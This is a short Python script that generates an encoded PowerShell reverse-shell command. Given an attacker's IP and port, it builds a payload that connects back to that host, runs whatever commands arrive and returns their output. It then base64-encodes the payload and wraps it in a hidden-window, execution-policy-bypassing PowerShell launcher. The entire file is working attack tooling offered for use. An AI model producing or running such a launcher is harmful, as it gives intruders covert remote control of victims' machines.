#!/usr/bin/env python3

import sys; import base64;

def exploit():
    ip = sys.argv[1]
    port = sys.argv[2]
    payload = 'Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("{ip}",{port}))'.format(ip=ip, port=port) + ';Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + "PS " + (pwd).Path + "> ");Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


    cmd = 'POwErsheLL -EXEcUtiONP  bypasS -NoprOf -Win hIddEn -e {}'.format(base64.b64encode(payload.encode('utf16')[2:]).decode())
    print(cmd)

if len(sys.argv) < 3:
    print('USAGE: ' + sys.argv[0] + ' LHOST + LPORT')
else:
    exploit()
